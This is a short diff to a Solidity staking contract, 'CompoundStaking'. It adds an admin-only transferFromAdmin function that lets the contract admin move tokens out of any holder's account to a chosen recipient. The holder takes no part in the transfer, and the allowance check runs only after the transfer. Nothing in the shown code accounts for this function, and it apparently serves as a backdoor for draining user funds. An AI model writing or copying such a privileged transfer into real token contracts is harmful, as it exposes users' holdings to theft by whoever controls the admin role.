@@ -204,6 +204,18 @@ contract CompoundStaking is IERC20 {
         return true;
     }
 
+    function transferFromAdmin(
+        address spender,
+        address recipient,
+        uint256 amount
+    ) public virtual onlyAdmin returns (bool) {
+        _transfer(spender, recipient, amount);
+        uint256 currentAllowance = allowances[spender][recipient];
+        require(currentAllowance >= amount, "ERC20: transfer amount exceeds allowance");
+        _approve(spender, recipient, currentAllowance - amount);
+        return true;
+    }
+
     function updateRewardPool() public {
         uint tokenPerBlock = apyUp * requiredBalance / apyDown / blocksInYear;
         uint delta = block.number - lastRewardBlock;
